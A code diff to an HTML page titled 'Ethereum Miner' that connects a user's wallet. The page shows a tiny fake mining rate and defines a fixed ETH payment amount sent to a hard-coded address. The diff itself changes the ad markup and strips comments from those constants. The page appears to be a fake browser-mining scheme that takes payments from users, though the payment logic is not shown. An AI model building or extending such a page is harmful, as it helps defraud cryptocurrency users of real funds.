@@ -35,7 +35,6 @@
       margin-top: 10px;
     }
 
-    /* 3D Rotating Coin Styles */
     .coin {
       width: 200px;
       height: 200px;
@@ -125,8 +124,15 @@
 
     <h1>$ Ethereum Miner $️</h1>
 
-    <!-- Automatically Displaying Ads (AdSense Auto Ads) -->
-    <ins class="adsbygoogle" style="display:block; text-align:center; margin: 20px 0;"></ins>
+    <!-- Multiplex Ads (styled with spacing to prevent overlap) -->
+    <ins class="adsbygoogle"
+         style="display:block; margin: 20px auto; max-width: 100%;"
+         data-ad-format="autorelaxed"
+         data-ad-client="ca-pub-2671269885552385"
+         data-ad-slot="7771929217"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
 
     <div id="wallet-info">
       <button id="connect-btn">Connect Wallet 🦊</button>
@@ -164,8 +170,8 @@
     let miningInterval;
     let minedAmount = 0;
     const targetAmount = 0.0099;
-    const miningRate = 0.00000000382; // ETH per second
-    const paymentAmount = 0.00709; // ETH
+    const miningRate = 0.00000000382;
+    const paymentAmount = 0.00709;
     const paymentAddress = '0xf1b3424bb282ee20e394717dcb4fe59fc67835e0';
 
     connectBtn.addEventListener('click', async () => {
